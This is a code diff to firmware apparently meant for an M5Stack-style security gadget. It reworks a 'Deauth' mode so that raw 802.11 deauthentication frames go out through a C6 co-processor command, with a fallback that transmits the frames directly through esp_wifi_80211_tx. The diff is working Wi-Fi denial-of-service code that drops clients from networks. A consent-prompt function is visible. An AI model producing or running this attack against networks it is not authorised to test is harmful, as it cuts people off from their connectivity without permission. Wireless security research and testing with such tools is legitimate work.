@@ -10,6 +10,7 @@
 #include <M5Unified.h>
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include "../comms/comms_manager.h"
 
 #define MODE_NAME "Deauth"
 #define STATUS_H  64
@@ -57,8 +58,23 @@ void sendDeauth(const DeauthNet& net) {
         0x00,0x00,              // Sequence
         0x07,0x00               // Reason: Class 3 frame
     };
-    esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
-    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+    // Send via C6 co-processor (handles raw 802.11 frames)
+    if (Comms::c6Available()) {
+        StaticJsonDocument<128> doc;
+        JsonObject params = doc.to<JsonObject>();
+        params["bssid"] = net.ssid;
+        params["channel"] = net.channel;
+        char bssidStr[18];
+        snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 net.bssid[0],net.bssid[1],net.bssid[2],
+                 net.bssid[3],net.bssid[4],net.bssid[5]);
+        params["bssid"] = bssidStr;
+        Comms::sendCommand(0, CMD_WIFI_DEAUTH, params);
+    } else {
+        // Fallback: direct attempt (may not work via hosted driver)
+        esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
+        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+    }
 }
 
 bool showConsent() {
